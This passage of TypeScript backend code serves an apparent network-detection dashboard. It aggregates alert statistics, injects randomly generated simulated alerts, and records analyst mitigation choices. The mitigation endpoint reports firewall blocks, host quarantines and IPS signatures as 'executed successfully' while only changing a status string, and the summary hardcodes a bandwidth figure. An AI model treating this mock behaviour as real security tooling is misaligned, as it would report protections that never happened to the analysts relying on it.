          lastTriggered: r.lastTriggeredAt || new Date().toISOString(),
          thresholdInfo: `${r.condition} ${r.criticalThreshold || r.warningThreshold || ''} ${r.unit || ''}`
        };
      });

      filtered.forEach(a => {
        if (!ruleViolationMap[a.ruleId]) {
          ruleViolationMap[a.ruleId] = {
            ruleId: a.ruleId,
            ruleName: a.ruleName,
            patternType: a.patternType,
            severity: a.severity,
            count: 0,
            affectedHosts: new Set(),
            topProto: a.protocol,
            topGeo: `${a.srcFlag} ${a.srcCountryCode}`,
            lastTriggered: a.timestamp,
            thresholdInfo: a.ruleThresholdViolated
          };
        }
        ruleViolationMap[a.ruleId].count += 1;
        ruleViolationMap[a.ruleId].affectedHosts.add(a.srcIp);
        ruleViolationMap[a.ruleId].affectedHosts.add(a.dstIp);
        ruleViolationMap[a.ruleId].topProto = a.protocol;
        ruleViolationMap[a.ruleId].topGeo = `${a.srcFlag} ${a.srcCountryCode}`;
      });

      const ruleViolations = Object.values(ruleViolationMap).map(rv => ({
        ruleId: rv.ruleId,
        ruleName: rv.ruleName,
        patternType: rv.patternType,
        severity: rv.severity,
        count: rv.count,
        percentage: totalAlerts > 0 ? Number(((rv.count / totalAlerts) * 100).toFixed(1)) : 0,
        affectedHostsCount: rv.affectedHosts.size,
        topProtocol: rv.topProto,
        topGeo: rv.topGeo,
        lastTriggered: rv.lastTriggered,
        thresholdInfo: rv.thresholdInfo
      })).sort((a, b) => b.count - a.count);

      res.json({
        success: true,
        summary: {
          totalAlerts,
          criticalCount,
          highCount,
          mediumCount,
          lowCount,
          activeThreats,
          mitigatedCount,
          totalBandwidthBurstGbps: '4.82 Gbps',
          uniqueThreatActors: geoDistribution.length,
          lastUpdatedAt: new Date().toISOString()
        },
        distributions: {
          severity: severityDistribution,
          protocol: protocolDistribution,
          geo: geoDistribution,
          timeSeries: timeSeriesDistribution
        },
        ruleViolations,
        alerts: filtered
      });
    } catch (e: any) {
      console.error('Error generating NDR alert analytics:', e);
      res.status(500).json({ success: false, error: e.message });
    }
  });

  // 18.2 POST /api/v1/ndr/analytics/simulate-violation (Inject dynamic test violation)
  router.post('/analytics/simulate-violation', (req: Request, res: Response) => {
    try {
      const { ruleId, customSeverity, customProtocol, customCountry } = req.body;
      const currentRules = loadNdrAlertRules();
      const targetRule = currentRules.find((r: any) => r.id === ruleId) || currentRules[0];

      const simCountries = [
        { name: 'United States', code: 'US', flag: '🇺🇸', city: 'San Jose, CA', asn: 'AS15169 Google LLC' },
        { name: 'Netherlands', code: 'NL', flag: '🇳🇱', city: 'Rotterdam', asn: 'AS202425 Serverius' },
        { name: 'China', code: 'CN', flag: '🇨🇳', city: 'Shanghai', asn: 'AS4812 China Telecom' },
        { name: 'Russia', code: 'RU', flag: '🇷🇺', city: 'Saint Petersburg', asn: 'AS12389 Rostelecom' },
        { name: 'Germany', code: 'DE', flag: '🇩🇪', city: 'Berlin', asn: 'AS3320 DTAG' },
        { name: 'Japan', code: 'JP', flag: '🇯🇵', city: 'Tokyo', asn: 'AS2516 KDDI' }
      ];

      const randomCountry = simCountries[Math.floor(Math.random() * simCountries.length)];
      const protocols = ['TCP', 'TLS/HTTPS', 'UDP', 'DNS', 'ICMP', 'SSH'] as const;
      const selectedProtocol = customProtocol || protocols[Math.floor(Math.random() * protocols.length)];

      const newAlertId = `NDR-ALT-${Math.floor(1000 + Math.random() * 9000)}`;
      const randomMbps = Math.floor(950 + Math.random() * 650);

      const newAlert: NdrAnalyticsAlert = {
        id: newAlertId,
        ruleId: targetRule ? targetRule.id : 'ndr-rule-bandwidth-burst',
        ruleName: targetRule ? targetRule.name : '即時頻寬異常告警 (Dynamic Triggered)',
        patternType: targetRule ? targetRule.patternType : 'bandwidth_surge',
        severity: customSeverity || (targetRule ? targetRule.severity : 'Critical'),
        protocol: selectedProtocol as any,
        srcIp: `198.18.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}`,
        srcPort: Math.floor(30000 + Math.random() * 25000),
        srcCountry: customCountry || randomCountry.name,
        srcCountryCode: randomCountry.code,
        srcFlag: randomCountry.flag,
        srcCity: randomCountry.city,
        srcAsn: randomCountry.asn,
        dstIp: `10.88.88.${Math.floor(100 + Math.random() * 110)}`,
        dstPort: selectedProtocol === 'DNS' ? 53 : selectedProtocol === 'SSH' ? 22 : 443,
        dstCountry: 'Taiwan (Core Internal)',
        dstCountryCode: 'TW',
        dstFlag: '🇹🇼',
        timestamp: new Date().toISOString(),
        duration: `${Math.floor(1 + Math.random() * 5)}m ${Math.floor(Math.random() * 59)}s`,
        bytesTransferred: `${(Math.random() * 3.5 + 0.8).toFixed(2)} GB`,
        bytesNumeric: Math.floor(Math.random() * 3000000000 + 800000000),
        packetsCount: Math.floor(Math.random() * 200000 + 40000),
        throughput: `${randomMbps} Mbps`,
        throughputMbps: randomMbps,
        mitreTactic: targetRule?.patternType === 'data_exfiltration' ? 'Exfiltration' : 
                    targetRule?.patternType === 'c2_beaconing' ? 'Command and Control' : 
                    targetRule?.patternType === 'abnormal_flow_cluster' ? 'Lateral Movement' : 'Impact',
        mitreTechnique: 'T1048.003 Exfiltration Over Alternative Protocol',
        payloadSnippet: `DYNAMIC_SIM_ALERT: Flow violated rule [${targetRule?.name}]. Detected throughput ${randomMbps} Mbps exceeding baseline limit.`,
        ruleThresholdViolated: `Threshold exceeded: Condition ${targetRule?.condition || '>='} ${targetRule?.criticalThreshold || 1200} (Actual: ${randomMbps} Mbps)`,
        status: 'Active',
        actionTaken: 'Pending SOC Analyst Action'
      };

      // Prepend to alerts list
      ndrAnalyticsAlerts.unshift(newAlert);
      if (ndrAnalyticsAlerts.length > 200) {
        ndrAnalyticsAlerts.pop();
      }

      // Update target rule trigger counts
      if (targetRule) {
        targetRule.triggerCount = (targetRule.triggerCount || 0) + 1;
        targetRule.lastTriggeredAt = new Date().toISOString();
        saveNdrAlertRules(currentRules);
      }

      res.json({
        success: true,
        message: `Successfully simulated traffic violation for rule "${newAlert.ruleName}"`,
        alert: newAlert
      });
    } catch (e: any) {
      console.error('Failed to simulate rule violation:', e);
      res.status(500).json({ success: false, error: e.message });
    }
  });

  // 18.3 POST /api/v1/ndr/analytics/mitigate (Apply instant SOC response action)
  router.post('/analytics/mitigate', (req: Request, res: Response) => {
    try {
      const { alertId, action, notes } = req.body;
      const alert = ndrAnalyticsAlerts.find(a => a.id === alertId);

      if (!alert) {
        return res.status(404).json({ success: false, error: `Alert with ID "${alertId}" not found.` });
      }

      const actionMap: Record<string, { status: 'Mitigated' | 'Resolved' | 'Investigating' | 'Active'; actionTaken: string }> = {
        'isolate_host': { status: 'Mitigated', actionTaken: 'Host Quarantined via EDR/NAC (802.1X VLAN 999)' },
        'block_ip': { status: 'Mitigated', actionTaken: `Border Firewall Drop Rule Applied (IP: ${alert.srcIp})` },
        'deploy_suricata': { status: 'Mitigated', actionTaken: 'Dynamic Suricata IPS Drop Signature Deployed' },
        'export_pcap': { status: 'Investigating', actionTaken: 'PCAP Forensics Stream Dumped to Storage' },
        'resolve': { status: 'Resolved', actionTaken: 'Resolved by SOC Analyst' },
        'acknowledge': { status: 'Investigating', actionTaken: 'Acknowledged by Tier 2 SOC Analyst' }
      };

      const matchedAction = actionMap[action] || { status: 'Mitigated', actionTaken: `Custom Action: ${action}` };

      alert.status = matchedAction.status;
      alert.actionTaken = matchedAction.actionTaken;

      res.json({
        success: true,
        message: `Mitigation action "${action}" executed successfully on alert ${alertId}.`,
        alert,
        actionLog: {
          timestamp: new Date().toISOString(),
          analyst: 'SOC Supervisor (Admin)',
          actionTaken: matchedAction.actionTaken,
          notes: notes || 'Automated response executed from NDR Alert Analytics view.'
        }
      });
    } catch (e: any) {
      console.error('Failed to mitigate alert:', e);
      res.status(500).json({ success: false, error: e.message });
    }
  });

  return router;
}



